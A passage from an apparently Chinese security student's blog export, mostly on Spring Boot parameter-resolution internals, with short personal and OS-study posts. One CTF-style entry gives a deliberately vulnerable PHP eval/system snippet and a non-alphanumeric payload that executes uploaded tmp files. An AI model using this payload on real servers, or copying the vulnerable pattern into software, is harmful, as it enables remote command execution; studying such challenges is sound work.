pv,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@RequestHeader(&quot;User-Agent&quot;)</span> String userAgent,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@RequestHeader</span> Map&lt;String, String&gt; header,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@RequestParam(&quot;age&quot;)</span> Integer age,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@RequestParam(&quot;inters&quot;)</span> List&lt;String&gt; inters,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@RequestHeader</span> Map&lt;String, String&gt; params,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@CookieValue(&quot;_ga&quot;)</span> String _ga,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@CookieValue(&quot;_ga&quot;)</span> Cookie cookie)</span>&#123;<br>        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;id&quot;</span>, id);<br>        map.put(<span class="hljs-string">&quot;name&quot;</span>, name);<br>        map.put(<span class="hljs-string">&quot;pv&quot;</span>, pv);<br>        map.put(<span class="hljs-string">&quot;userAgent&quot;</span>, userAgent);<br>        map.put(<span class="hljs-string">&quot;headers&quot;</span>, header);<br>        map.put(<span class="hljs-string">&quot;age&quot;</span>, age);<br>        map.put(<span class="hljs-string">&quot;inters&quot;</span>, inters);<br>        map.put(<span class="hljs-string">&quot;params&quot;</span>, params);<br>        map.put(<span class="hljs-string">&quot;_ga&quot;</span>, _ga);<br>        System.out.println(cookie.getName()+<span class="hljs-string">&quot;==&gt;&quot;</span>+cookie.getValue());<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/save&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">postMethod</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String content)</span>&#123;<br>        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;content&quot;</span>, content);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//request.setAttribute和@RequestAttribute搭配使用</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/goto&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goToPage</span><span class="hljs-params">(HttpServletRequest request)</span><br>    &#123;<br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;成功&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-number">200</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;<br>    &#125;<br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@GetMapping(&quot;/success&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-meta">@RequestAttribute(&quot;msg&quot;)</span> String msg,</span><br><span class="hljs-params">                          <span class="hljs-meta">@RequestAttribute(&quot;code&quot;)</span> Integer code,</span><br><span class="hljs-params">                          HttpServletRequest request)</span>&#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">msg1</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br>        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;reqMethod_msg&quot;</span>, msg1);<br>        map.put(<span class="hljs-string">&quot;annotation_msg&quot;</span>, msg);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>@MatrixVariable</code>使用方法略</p><h3 id="各种类型参数解析原理"><a href="#各种类型参数解析原理" class="headerlink" title="各种类型参数解析原理"></a>各种类型参数解析原理</h3><p>从<code>DispatcherServlet.java</code>开始分析</p><ul><li><p>HandlerMapping中遍历找到能处理请求的Handler(Controller.method())</p></li><li><p>找到方法后用<code>getHandlerAdapter()</code>方法遍历所有HandlerAdapter得到合适的适配器</p></li><li><p>执行目标方法</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br></code></pre></td></tr></table></figure><p>在目标方法执行前会设置<code>argumentResolvers</code>参数解析器来确定将要执行的目标方法的每一个参数值是多少</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221201093854125-16699737693506.png"></p><p><code>returnValueHandlers</code>返回值处理器确定控制器能return哪些类型</p><p><img src="/../images/SpringBoot%E5%AD%A6%E4%B9%A0/image-20221201094128103-16699737693507.png"></p><p>执行方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">invocableMethod.invokeAndHandle(webRequest, mavContainer);<br></code></pre></td></tr></table></figure><p>进去又有一个函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br></code></pre></td></tr></table></figure><p>这个方法执行完会跳到我们写的控制器处</p><p>进去看看这个方法</p><p>获得方法参数的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br></code></pre></td></tr></table></figure><p>进去看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">MethodParameter[] parameters = getMethodParameters();<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,<br>Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//获得所有参数信息，但值为空</span><br>MethodParameter[] parameters = getMethodParameters();<br>       <span class="hljs-comment">//判断参数是否为空</span><br><span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;<br><span class="hljs-keyword">return</span> EMPTY_ARGS;<br>&#125;<br><span class="hljs-comment">//args作为返回值</span><br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[parameters.length];<br>       <span class="hljs-comment">//遍历所有参数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; parameters.length; i++) &#123;<br><span class="hljs-type">MethodParameter</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> parameters[i];<br>parameter.initParameterNameDiscovery(<span class="hljs-built_in">this</span>.parameterNameDiscoverer);<br>args[i] = findProvidedArgument(parameter, providedArgs);<br><span class="hljs-keyword">if</span> (args[i] != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>           <span class="hljs-comment">//判断当前参数解析器是否支持参数类型</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resolvers.supportsParameter(parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-comment">//解析参数</span><br>args[i] = <span class="hljs-built_in">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-built_in">this</span>.dataBinderFactory);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br><span class="hljs-comment">// Leave stack trace for later, exception may actually be resolved and handled...</span><br><span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">exMsg</span> <span class="hljs-operator">=</span> ex.getMessage();<br><span class="hljs-keyword">if</span> (exMsg != <span class="hljs-literal">null</span> &amp;&amp; !exMsg.contains(parameter.getExecutable().toGenericString())) &#123;<br>logger.debug(formatArgumentError(parameter, exMsg));<br>&#125;<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> args;<br>&#125;<br></code></pre></td></tr></table></figure><p>进去<code>this.resolvers.supportsParameter(parameter)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodArgumentResolver <span class="hljs-title function_">getArgumentResolver</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-type">HandlerMethodArgumentResolver</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.argumentResolverCache.get(parameter);<br><span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-comment">//遍历所有参数解析器</span><br><span class="hljs-keyword">for</span> (HandlerMethodArgumentResolver resolver : <span class="hljs-built_in">this</span>.argumentResolvers) &#123;<br>               <span class="hljs-comment">//支持就放入缓存，免得下次还要调用函数找</span><br>               <span class="hljs-comment">//每个解析器有属于自己的supportsParameter()函数</span><br><span class="hljs-keyword">if</span> (resolver.supportsParameter(parameter)) &#123;<br>result = resolver;<br><span class="hljs-built_in">this</span>.argumentResolverCache.put(parameter, result);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>进去<code>args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);</code>里面，进入<code>return resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory);</code>里面具体不写了</p><p>就是把我们请求传入的参数和控制器里面的参数遍历查找匹配，就是这个思路</p><h3 id="Servlet-API参数解析原理"><a href="#Servlet-API参数解析原理" class="headerlink" title="Servlet API参数解析原理"></a>Servlet API参数解析原理</h3><p>上面说<code>resolver.supportsParameter(parameter)</code>是处理参数的。每个注解或者正常的参数都有自己的<code>supportsParameter()</code>方法。</p><p>下面是<code>RequestParamMethodArgumentResolver</code>类里面的<code>supportsParameter()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br>Class&lt;?&gt; paramType = parameter.getParameterType();<br><span class="hljs-keyword">return</span> (WebRequest.class.isAssignableFrom(paramType) ||<br>ServletRequest.class.isAssignableFrom(paramType) ||<br>MultipartRequest.class.isAssignableFrom(paramType) ||<br>HttpSession.class.isAssignableFrom(paramType) ||<br>(pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; pushBuilder.isAssignableFrom(paramType)) ||<br>(Principal.class.isAssignableFrom(paramType) &amp;&amp; !parameter.hasParameterAnnotations()) ||<br>InputStream.class.isAssignableFrom(paramType) ||<br>Reader.class.isAssignableFrom(paramType) ||<br>HttpMethod.class == paramType ||<br>Locale.class == paramType ||<br>TimeZone.class == paramType ||<br>ZoneId.class == paramType);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面这个例子参数为<code>HttpServletRequest</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/goto&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">goToPage</span><span class="hljs-params">(HttpServletRequest request)</span><br>&#123;<br>    request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;成功&quot;</span>);<br>    request.setAttribute(<span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-number">200</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>满足上面<code>supportsParameter()</code>的第二个条件<code>ServletRequest.class.isAssignableFrom(paramType)</code>，说明支持解析</p><p>然后看看如何解析</p><p>它主要是通过<code>NativeWebRequest</code>类的<code>getNativeRequest</code>方法获得原生请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">webRequest.getNativeRequest(requiredType);<br></code></pre></td></tr></table></figure><p>用<code>HttpServletRequest</code>类把原生请求包装起来</p><h3 id="Model、Map原理"><a href="#Model、Map原理" class="headerlink" title="Model、Map原理"></a>Model、Map原理</h3><p>前面是一样的，判断当前参数解析器是否支持参数类型然后解析参数</p><p>不同的是解析参数的过程，在里面无论是Model还是Map类型都会调用<code>maxContainer.getModel()</code>返回一个BindingAwareModelMap类型</p><p>模型是货物，视图是目的地</p><p>目标方法执行完成会将所有的数据放在ModelAndViewContainer这个类的对象里面</p><p>当我们转发Map或者Model时，可以一直跟踪源代码，发现在<code>InternalResourceView</code>类的<code>renderMergedOutputModel</code>方法中的<code>exposeModelAsRequestAttributes</code>方法中可以看到它是<strong>怎么处理转发</strong>的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exposeModelAsRequestAttributes</span><span class="hljs-params">(Map&lt;String, Object&gt; model,</span><br><span class="hljs-params">HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>model.forEach((name, value) -&gt; &#123;<br><span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>request.setAttribute(name, value);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>request.removeAttribute(name);<br>&#125;<br>&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是遍历调用<code>setAttribute</code>方法存储键值对</p><h3 id="自定义参数原理"><a href="#自定义参数原理" class="headerlink" title="自定义参数原理"></a>自定义参数原理</h3><p>首先创建两个自定义类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.bean;<br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> Pet pet;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.bean;<br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> lombok.ToString;<br><span class="hljs-meta">@ToString</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一个控制器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@PostMapping(&quot;/student&quot;)</span><br>    <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">Stu</span><span class="hljs-params">(Student student)</span>&#123;<br>        <span class="hljs-keyword">return</span> student;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一个提交表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/student&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    姓名：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;achilles&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    年龄：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    宠物名：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pet.name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ach&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    宠物重量：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pet.age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发送请求后可以看到json结果</p><p>研究提交的参数内容和对象如何绑定</p><p>前面也都是一样的</p><p>调试后发现在<code>getArgumentResolver</code>方法处理过程中，找到了<strong>支持自定义类型</strong>的<strong>参数解析器</strong><code>ServletModelAttributeMethodProcessor</code></p><p>后面的过程粗略记录一下：把请求的数据拿到，因为http协议传输的都是String，最后需要用对应的<code>converter</code>转一下类型，比如先把数据转换成整数再赋值给age</p><h3 id="自定义converter"><a href="#自定义converter" class="headerlink" title="自定义converter"></a>自定义converter</h3>]]></content>
    
    
    <categories>
      
      <category>JavaSecurity</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SpringMVC学习</title>
    <link href="/posts/dee12bd7.html"/>
    <url>/posts/dee12bd7.html</url>
    
    <content type="html"><![CDATA[<p>文章在语雀发布<a href="https://www.yuque.com/yuxuanzhe/javasec/springmvc">https://www.yuque.com/yuxuanzhe/javasec/springmvc</a></p>]]></content>
    
    
    <categories>
      
      <category>JavaSecurity</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于p神的无字母数字webshell之提高篇的思考</title>
    <link href="/posts/32276634.html"/>
    <url>/posts/32276634.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章是记录看了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p神的无字母数字webshell之提高篇</a>后发现的一个黑魔法</p><p>先介绍一个Linux变量<code>$_</code>，它存储着上次程序传入的参数。</p><p>比如执行<code>echo can you get the file of tmp</code>命令后，再执行<code>echo $_</code>，发现结果是<code>tmp</code>。</p><p>我们把题目条件改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">10</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(\&quot;echo can you get the file of tmp;&quot;</span>.<span class="hljs-variable">$code</span>.<span class="hljs-string">&quot;\&quot;)&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=. /\<span class="hljs-variable">$_</span>/*<br></code></pre></td></tr></table></figure><p>不知道会在哪场比赛最先出现呢</p><p>有个问题是在docker里面payload会失效，之后换个参数看看</p>]]></content>
    
    
    <categories>
      
      <category>ramble</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb学习</title>
    <link href="/posts/6af6e090.html"/>
    <url>/posts/6af6e090.html</url>
    
    <content type="html"><![CDATA[<p>文章干脆就在语雀上发布了<a href="https://www.yuque.com/yuxuanzhe/javasec/javaweb">https://www.yuque.com/yuxuanzhe/javasec/javaweb</a></p>]]></content>
    
    
    <categories>
      
      <category>JavaSecurity</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>树莓派连接电脑WIFI</title>
    <link href="/posts/e371aac4.html"/>
    <url>/posts/e371aac4.html</url>
    
    <content type="html"><![CDATA[<p>通过树莓派连接电脑WIFI进而可以连接树莓派的SSH，卡了一个下午。写好自动连接WIFI的配置文件后就连接不了WIFI了。找到一篇文章，可以让树莓派正确连接WIFI<a href="https://blog.csdn.net/baibaibubaisay/article/details/122637630">https://blog.csdn.net/baibaibubaisay/article/details/122637630</a><br>其他（ssh配置等）参考<a href="https://xz.aliyun.com/t/7359">https://xz.aliyun.com/t/7359</a></p>]]></content>
    
    
    <categories>
      
      <category>ramble</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大一下的暑假</title>
    <link href="/posts/2a444366.html"/>
    <url>/posts/2a444366.html</url>
    
    <content type="html"><![CDATA[<p>搞了一下AVX的学习，还有Java安全等。感觉先专注web方面吧。密码学什么的文章也可以不写了，但是也不删，留着纪念吧。<br>后面应该会写一些复杂的东西。</p>]]></content>
    
    
    <categories>
      
      <category>ramble</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ucore概述</title>
    <link href="/posts/1de4270e.html"/>
    <url>/posts/1de4270e.html</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文根据慕课资料进行粗略学习操作系统的知识，选择性地写一下lab练习<br><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/">ucore课程文档</a><br><a href="https://www.xuetangx.com/course/THU08091000267/10322317">课程地址</a><br><a href="https://github.com/1399852153/ucore_os_lab">其他大佬的lab答案地址</a><br><a href="https://www.cnblogs.com/xiaoxiongcanguan/p/13714587.html">推荐博客1</a><br><a href="https://www.jianshu.com/p/2f95d38afa1d">推荐博客2</a><br>建议先阅读《编码：隐匿在计算机软硬件背后的语言》和《X86汇编语言-从实模式到保护模式》</p><h2 id="第一条指令"><a href="#第一条指令" class="headerlink" title="第一条指令"></a>第一条指令</h2><p>CPU加电后会进行初始化，然后在内存读第一条指令。内存有一部分是ROM、一部分是RAM。断电后RAM信息会消失，但是ROM内容一直都在。<br>读的第一个指令是CS:IP指向的地址（值应该是默认的），刚加电的CPU处于16位实模式下，寻址空间大小为2的20次方（1MB），CS、IP都是16位的。CS*16+IP（0xFFFF0）是第一条指令的地址，同时CS:IP要在2的20次方的寻址空间内。第一条指令在最底下的1MB空间内。这第一条指令及其跟着的指令就是BIOS，它要提供一些服务，然后CPU才能访问磁盘设备。</p><h2 id="BIOS"><a href="#BIOS" class="headerlink" 